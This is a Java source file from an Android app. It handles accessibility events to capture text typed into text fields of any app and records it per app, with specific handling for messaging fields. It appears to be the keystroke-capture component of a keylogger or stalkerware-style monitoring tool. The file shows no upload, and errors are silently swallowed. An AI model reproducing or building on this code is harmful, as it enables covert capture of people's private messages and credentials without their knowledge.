package com.im.bin.accessibility.data;

import android.content.Context;

import com.im.bin.accessibility.AccessibilityUtil;
import com.im.bin.interfaces.OnAccessibilityEvent;
import com.im.bin.models.AccessibilityEventModel;

import static com.im.bin.accessibility.AccessibilityUtil.lastPackageName;
import static com.im.bin.accessibility.AccessibilityUtil.lastTypedText;

public class ViewTextChangeEventData implements OnAccessibilityEvent {

    @Override
    public void onAccessibilityEvent(Context context, AccessibilityEventModel accessibilityEventModel) {
        try {
            String eventClassName = accessibilityEventModel.getEventClassName();
            String eventText = accessibilityEventModel.getEventText();
            String eventPackage = accessibilityEventModel.getPackageName();
            if (eventClassName.equals("android.widget.EditText")) {
                String typedText = "";
                if (eventText != null)
                    typedText = eventText;
                typedText = typedText.substring(1, typedText.length() - 1);
                if (lastPackageName.isEmpty() || eventPackage.equals(lastPackageName)) {
                    if (lastTypedText.isEmpty() || typedText.startsWith(lastTypedText)) {
                        lastTypedText = typedText;
                        setLastIMTypedText();
                    } else {
                        lastTypedText = typedText;
                        setLastIMTypedText();
                    }
                    lastPackageName = eventPackage;
                } else {
                    lastTypedText = typedText;
                    setLastIMTypedText();
                    lastPackageName = eventPackage;
                }
            }
        } catch (Exception e) {
            e.getMessage();
        }
    }

    private void setLastIMTypedText() {
        if (!lastTypedText.contains("Type a message"))
            AccessibilityUtil.lastIMTypedText = lastTypedText;
    }
}
